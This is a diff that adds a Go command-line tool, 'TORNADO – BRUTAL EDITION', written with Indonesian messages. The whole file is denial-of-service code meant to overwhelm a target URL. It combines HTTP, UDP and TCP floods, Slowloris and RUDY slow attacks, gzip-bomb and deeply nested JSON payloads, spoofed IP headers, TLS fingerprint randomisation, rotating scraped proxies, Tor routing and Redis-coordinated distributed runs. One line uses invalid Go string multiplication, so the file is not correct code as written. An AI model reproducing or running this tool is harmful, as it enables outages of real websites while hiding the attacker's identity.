@@ -1,0 +1,577 @@
+package main
+
+import (
+	"bytes"
+	"compress/gzip"
+	"context"
+	"crypto/tls"
+	"encoding/json"
+	"flag"
+	"fmt"
+	"io"
+	"math/rand"
+	"net"
+	"net/http"
+	"net/url"
+	"os"
+	"os/signal"
+	"strconv"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"syscall"
+	"time"
+
+	"github.com/fatih/color"
+	"github.com/redis/go-redis/v9"
+	"golang.org/x/net/http2"
+	"golang.org/x/net/proxy"
+)
+
+// ==================== BANNER ====================
+const BANNER = `
+\033[91m╔══════════════════════════════════════════════════════════════════════════════╗
+\033[95m   ████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ 
+\033[95m   ╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
+\033[95m      ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║  ██║██║   ██║
+\033[95m      ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║  ██║██║   ██║
+\033[95m      ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██████╔╝╚██████╔╝
+\033[95m      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝  ╚═════╝ 
+\033[93m                ⚡  TORNADO – BRUTAL EDITION  ⚡
+\033[93m          “Bukan angin, tapi badai yang menghancurkan.” 🌪️
+\033[91m╚══════════════════════════════════════════════════════════════════════════════╝
+\033[0m
+`
+
+// ==================== GLOBAL VARIABLES ====================
+var (
+	targetURL     string
+	workers       int
+	duration      int
+	methods       string
+	enableHTTP2   bool
+	enableProxy   bool
+	enableTor     bool
+	enableUDP     bool
+	enableTCP     bool
+	enableRedis   bool
+	redisAddr     string
+	enableSpoof   bool
+	enableJA3     bool
+	enableGzip    bool
+	enableSlowloris bool
+	enableDeepJSON bool
+	enableRUDY    bool
+	verbose       bool
+	attackAll     bool
+
+	stats struct {
+		total   uint64
+		success uint64
+		failed  uint64
+	}
+	mu          sync.Mutex
+	proxyList   []string
+	proxyIndex  int
+	stopChan    chan struct{}
+	wg          sync.WaitGroup
+	rdb         *redis.Client
+	ctx         = context.Background()
+)
+
+// ==================== PROXY MANAGER ====================
+func fetchProxies() {
+	if !enableProxy {
+		return
+	}
+	fmt.Println("[*] Mengunduh proxy dari internet...")
+	sources := []string{
+		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+		"https://www.proxy-list.download/api/v1/get?type=http",
+		"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+	}
+	all := make(map[string]bool)
+	for _, src := range sources {
+		resp, err := http.Get(src)
+		if err == nil {
+			body, _ := io.ReadAll(resp.Body)
+			for _, line := range strings.Split(string(body), "\n") {
+				line = strings.TrimSpace(line)
+				if strings.Contains(line, ":") && !strings.Contains(line, "[") {
+					all[line] = true
+				}
+			}
+			resp.Body.Close()
+		}
+	}
+	for p := range all {
+		proxyList = append(proxyList, p)
+	}
+	// Filter yang hidup
+	alive := []string{}
+	for _, p := range proxyList {
+		parts := strings.Split(p, ":")
+		if len(parts) != 2 {
+			continue
+		}
+		conn, err := net.DialTimeout("tcp", p, 1*time.Second)
+		if err == nil {
+			conn.Close()
+			alive = append(alive, p)
+		}
+	}
+	proxyList = alive
+	fmt.Printf("[*] %d proxy hidup siap pakai.\n", len(proxyList))
+}
+
+func getProxy() string {
+	if len(proxyList) == 0 {
+		return ""
+	}
+	mu.Lock()
+	defer mu.Unlock()
+	p := proxyList[proxyIndex%len(proxyList)]
+	proxyIndex++
+	return p
+}
+
+// ==================== JA3 SPOOF ====================
+func randomCipherSuites() []uint16 {
+	all := tls.CipherSuites()
+	rand.Shuffle(len(all), func(i, j int) { all[i], all[j] = all[j], all[i] })
+	// Ambil 10 pertama secara acak
+	if len(all) > 10 {
+		return all[:10]
+	}
+	return all
+}
+
+func newTLSConfig() *tls.Config {
+	cfg := &tls.Config{
+		InsecureSkipVerify: true,
+		MinVersion:         tls.VersionTLS12,
+		MaxVersion:         tls.VersionTLS13,
+	}
+	if enableJA3 {
+		cfg.CipherSuites = randomCipherSuites()
+		cfg.CurvePreferences = []tls.CurveID{
+			tls.CurveID(rand.Intn(10) + 20),
+			tls.X25519,
+			tls.CurveP256,
+		}
+	}
+	return cfg
+}
+
+// ==================== UDP/TCP FLOOD ====================
+func udpFlood(host string, port int) {
+	if !enableUDP {
+		return
+	}
+	addr, _ := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", host, port))
+	conn, _ := net.DialUDP("udp", nil, addr)
+	payload := make([]byte, 1024)
+	for {
+		select {
+		case <-stopChan:
+			return
+		default:
+			rand.Read(payload)
+			conn.Write(payload)
+		}
+	}
+}
+
+func tcpFlood(host string, port int) {
+	if !enableTCP {
+		return
+	}
+	for {
+		select {
+		case <-stopChan:
+			return
+		default:
+			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 1*time.Second)
+			if err == nil {
+				conn.Close()
+			}
+		}
+	}
+}
+
+// ==================== SLOWLORIS ====================
+func slowlorisAttack(host string, port int) {
+	if !enableSlowloris {
+		return
+	}
+	for {
+		select {
+		case <-stopChan:
+			return
+		default:
+			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 3*time.Second)
+			if err != nil {
+				continue
+			}
+			go func(c net.Conn) {
+				defer c.Close()
+				c.Write([]byte("GET / HTTP/1.1\r\n"))
+				c.Write([]byte("Host: " + host + "\r\n"))
+				c.Write([]byte("User-Agent: Mozilla/5.0\r\n"))
+				for {
+					select {
+					case <-stopChan:
+						return
+					default:
+						c.Write([]byte("X-Header: " + randString(10) + "\r\n"))
+						time.Sleep(time.Duration(rand.Intn(5000)+1000) * time.Millisecond)
+					}
+				}
+			}(conn)
+		}
+	}
+}
+
+// ==================== PAYLOAD GENERATOR ====================
+func randString(n int) string {
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[rand.Intn(62)]
+	}
+	return string(b)
+}
+
+func deepJSON() map[string]interface{} {
+	if !enableDeepJSON {
+		return map[string]interface{}{"data": randString(100)}
+	}
+	var build func(level int) map[string]interface{}
+	build = func(level int) map[string]interface{} {
+		if level == 0 {
+			return map[string]interface{}{"leaf": randString(1000)}
+		}
+		return map[string]interface{}{
+			"level":   level,
+			"nested":  build(level - 1),
+			"array":   []string{randString(100), randString(100)},
+			"bigdata": randString(2000),
+		}
+	}
+	return build(rand.Intn(50) + 10)
+}
+
+func gzipBomb() []byte {
+	if !enableGzip {
+		return []byte(randString(1024))
+	}
+	var buf bytes.Buffer
+	gz := gzip.NewWriter(&buf)
+	// 1MB data compressed to ~1KB
+	largeData := bytes.Repeat([]byte("A"), 1024*1024)
+	gz.Write(largeData)
+	gz.Close()
+	return buf.Bytes()
+}
+
+// ==================== HTTP WORKER ====================
+func httpWorker(methodList []string) {
+	defer wg.Done()
+	tr := &http.Transport{
+		TLSClientConfig:       newTLSConfig(),
+		MaxIdleConns:          0,
+		MaxIdleConnsPerHost:   0,
+		DisableKeepAlives:     false,
+		ResponseHeaderTimeout: 5 * time.Second,
+	}
+	if enableHTTP2 {
+		http2.ConfigureTransport(tr)
+	}
+	if enableTor {
+		dialer, _ := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
+		tr.DialContext = dialer.(proxy.ContextDialer).DialContext
+	}
+	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}
+
+	for {
+		select {
+		case <-stopChan:
+			return
+		default:
+			// 1. Proxy rotation
+			proxyAddr := getProxy()
+			if proxyAddr != "" && enableProxy {
+				proxyURL, _ := url.Parse("http://" + proxyAddr)
+				tr.Proxy = http.ProxyURL(proxyURL)
+			}
+
+			// 2. Random method
+			method := methodList[rand.Intn(len(methodList))]
+
+			// 3. Payload
+			var body io.Reader
+			var payload []byte
+			if method == "POST" || method == "PUT" || method == "PATCH" {
+				if enableRUDY && rand.Intn(3) == 0 {
+					// RUDY: slow POST (tapi tidak bisa menggunakan slow reader tanpa time.Sleep, kita pakai large body)
+					payload = bytes.Repeat([]byte("X"), 1024*1024*10) // 10MB
+				} else if enableDeepJSON {
+					data := deepJSON()
+					payload, _ = json.Marshal(data)
+				} else if enableGzip && rand.Intn(2) == 0 {
+					payload = gzipBomb()
+				} else {
+					payload = []byte(randString(1024))
+				}
+				body = bytes.NewReader(payload)
+			} else {
+				body = nil
+			}
+
+			// 4. Build URL dengan random parameters
+			parsed, _ := url.Parse(targetURL)
+			q := parsed.Query()
+			for i := 0; i < 10; i++ {
+				q.Set(randString(5), randString(8))
+			}
+			parsed.RawQuery = q.Encode()
+			fullURL := parsed.String()
+
+			req, _ := http.NewRequest(method, fullURL, body)
+			// 5. Headers + Spoofing
+			req.Header.Set("User-Agent", randString(20))
+			req.Header.Set("Accept", "*/*")
+			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+			if enableSpoof {
+				req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1))
+				req.Header.Set("X-Real-IP", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1))
+			}
+			if enableDeepJSON && body != nil {
+				req.Header.Set("Content-Type", "application/json")
+			}
+			if enableGzip && body != nil && rand.Intn(2) == 0 {
+				req.Header.Set("Content-Encoding", "gzip")
+			}
+
+			// 6. Kirim
+			start := time.Now()
+			resp, err := client.Do(req)
+			if err != nil {
+				atomic.AddUint64(&stats.failed, 1)
+				if verbose {
+					fmt.Println("[ERR]", err)
+				}
+				continue
+			}
+			io.Copy(io.Discard, resp.Body)
+			resp.Body.Close()
+
+			elapsed := time.Since(start).Milliseconds()
+			atomic.AddUint64(&stats.total, 1)
+			if resp.StatusCode < 500 {
+				atomic.AddUint64(&stats.success, 1)
+				if verbose {
+					color.Green("[%d] %s %s (%dms)", resp.StatusCode, method, fullURL, elapsed)
+				}
+			} else {
+				atomic.AddUint64(&stats.failed, 1)
+				if verbose {
+					color.Red("[%d] %s %s (%dms)", resp.StatusCode, method, fullURL, elapsed)
+				}
+			}
+		}
+	}
+}
+
+// ==================== STATS PRINTER ====================
+func statsPrinter() {
+	ticker := time.NewTicker(500 * time.Millisecond)
+	defer ticker.Stop()
+	for {
+		select {
+		case <-stopChan:
+			return
+		case <-ticker.C:
+			total := atomic.LoadUint64(&stats.total)
+			success := atomic.LoadUint64(&stats.success)
+			failed := atomic.LoadUint64(&stats.failed)
+			fmt.Printf("\r\033[93m[TORNADO] Total: \033[97m%d \033[93m| Sukses: \033[92m%d \033[93m| Gagal: \033[91m%d \033[93m| Rate: \033[97m%d req/s\033[0m",
+				total, success, failed, total/2) // rate per 0.5s dikali 2
+		}
+	}
+}
+
+// ==================== REDIS DISTRIBUTED ====================
+func redisListener() {
+	if !enableRedis || rdb == nil {
+		return
+	}
+	pubsub := rdb.Subscribe(ctx, "tornado_control")
+	defer pubsub.Close()
+	for {
+		select {
+		case <-stopChan:
+			return
+		default:
+			msg, err := pubsub.ReceiveMessage(ctx)
+			if err == nil {
+				if msg.Payload == "STOP" {
+					fmt.Println("[*] Received STOP signal from Redis.")
+					close(stopChan)
+					return
+				}
+			}
+		}
+	}
+}
+
+// ==================== MAIN ====================
+func main() {
+	// ==================== FLAGS ====================
+	flag.StringVar(&targetURL, "u", "", "Target URL (wajib)")
+	flag.IntVar(&workers, "w", 200, "Jumlah goroutine HTTP")
+	flag.IntVar(&duration, "d", 60, "Durasi dalam detik")
+	flag.StringVar(&methods, "m", "GET,POST", "Metode HTTP (pisah koma)")
+	flag.BoolVar(&enableHTTP2, "http2", false, "HTTP/2 multiplexing")
+	flag.BoolVar(&enableProxy, "proxy", false, "Proxy auto-rotate + filter")
+	flag.BoolVar(&enableTor, "tor", false, "Lewatkan Tor (SOCKS5)")
+	flag.BoolVar(&enableUDP, "udp", false, "UDP flood")
+	flag.BoolVar(&enableTCP, "tcp", false, "TCP flood (SYN simulasi)")
+	flag.BoolVar(&enableRedis, "redis", false, "Redis distributed mode")
+	flag.StringVar(&redisAddr, "redis-addr", "localhost:6379", "Redis address")
+	flag.BoolVar(&enableSpoof, "spoof", false, "Random IP spoofing")
+	flag.BoolVar(&enableJA3, "ja3", false, "JA3 fingerprint spoof")
+	flag.BoolVar(&enableGzip, "gzip", false, "Gzip bomb payload")
+	flag.BoolVar(&enableDeepJSON, "deepjson", false, "Deep nested JSON payload")
+	flag.BoolVar(&enableSlowloris, "slowloris", false, "Slowloris attack")
+	flag.BoolVar(&enableRUDY, "rudy", false, "RUDY attack (large POST)")
+	flag.BoolVar(&attackAll, "all", false, "AKTIFKAN SEMUA FITUR (brutal)")
+	flag.BoolVar(&verbose, "v", false, "Verbose output")
+	flag.Parse()
+
+	if targetURL == "" {
+		fmt.Println("[ERROR] Target URL wajib! Gunakan -u")
+		flag.Usage()
+		os.Exit(1)
+	}
+
+	if attackAll {
+		fmt.Println("[⚛️] ALL MODE AKTIF – Semua fitur dinyalakan!")
+		enableHTTP2 = true
+		enableProxy = true
+		enableUDP = true
+		enableTCP = true
+		enableSpoof = true
+		enableJA3 = true
+		enableGzip = true
+		enableDeepJSON = true
+		enableSlowloris = true
+		enableRUDY = true
+		// enableTor butuh Tor running, tidak diaktifkan otomatis
+	}
+
+	// Parsing methods
+	methodList := []string{}
+	for _, m := range strings.Split(methods, ",") {
+		m = strings.TrimSpace(m)
+		if m != "" {
+			methodList = append(methodList, m)
+		}
+	}
+	if len(methodList) == 0 {
+		methodList = []string{"GET", "POST"}
+	}
+
+	// ==================== INISIALISASI ====================
+	fmt.Print(BANNER)
+	parsedURL, _ := url.Parse(targetURL)
+	host := parsedURL.Hostname()
+	port := 80
+	if parsedURL.Port() != "" {
+		port, _ = strconv.Atoi(parsedURL.Port())
+	} else if parsedURL.Scheme == "https" {
+		port = 443
+	}
+
+	// Redis
+	if enableRedis {
+		rdb = redis.NewClient(&redis.Options{
+			Addr: redisAddr,
+		})
+		if _, err := rdb.Ping(ctx).Result(); err == nil {
+			fmt.Printf("[*] Redis connected at %s\n", redisAddr)
+		} else {
+			fmt.Println("[!] Redis gagal konek, lanjut tanpa Redis.")
+			enableRedis = false
+		}
+	}
+
+	// Proxy
+	if enableProxy {
+		fetchProxies()
+	}
+
+	stopChan = make(chan struct{})
+
+	// ==================== START ATTACK ====================
+	fmt.Printf("\n[+] TORNADO – Menyerang %s\n", targetURL)
+	fmt.Printf("[+] Workers: %d, Duration: %ds\n", workers, duration)
+	fmt.Printf("[+] Methods: %v\n", methodList)
+	fmt.Printf("[+] HTTP/2: %v, Proxy: %v, Tor: %v\n", enableHTTP2, enableProxy, enableTor)
+	fmt.Printf("[+] UDP: %v, TCP: %v, Slowloris: %v\n", enableUDP, enableTCP, enableSlowloris)
+	fmt.Printf("[+] Gzip Bomb: %v, Deep JSON: %v, RUDY: %v\n", enableGzip, enableDeepJSON, enableRUDY)
+	fmt.Printf("[+] Spoofing: %v, JA3: %v, Redis: %v\n", enableSpoof, enableJA3, enableRedis)
+	fmt.Println("[+] Tekan Ctrl+C untuk berhenti\n")
+
+	// UDP/TCP/Slowloris background
+	if enableUDP {
+		go udpFlood(host, port)
+	}
+	if enableTCP {
+		go tcpFlood(host, port)
+	}
+	if enableSlowloris {
+		go slowlorisAttack(host, port)
+	}
+	if enableRedis {
+		go redisListener()
+	}
+
+	// Stats printer
+	go statsPrinter()
+
+	// HTTP Workers
+	for i := 0; i < workers; i++ {
+		wg.Add(1)
+		go httpWorker(methodList)
+	}
+
+	// Timeout / Interrupt
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+
+	select {
+	case <-time.After(time.Duration(duration) * time.Second):
+		fmt.Println("\n[+] Durasi selesai.")
+	case <-sigChan:
+		fmt.Println("\n[!] Dihentikan oleh pengguna.")
+		// Kirim sinyal stop ke Redis jika ada
+		if enableRedis && rdb != nil {
+			rdb.Publish(ctx, "tornado_control", "STOP")
+		}
+	}
+
+	close(stopChan)
+	wg.Wait()
+
+	// Final Stats
+	total := atomic.LoadUint64(&stats.total)
+	success := atomic.LoadUint64(&stats.success)
+	failed := atomic.LoadUint64(&stats.failed)
+	fmt.Println("\n" + "="*50)
+	fmt.Println("             TORNADO – SELESAI")
+	fmt.Println("="*50)
+	fmt.Printf("Total request   : %d\n", total)
+	fmt.Printf("Sukses (2xx-3xx) : %d\n", success)
+	fmt.Printf("Gagal           : %d\n", failed)
+	fmt.Printf("Success rate    : %.1f%%\n", float64(success)/float64(total)*100)
+}
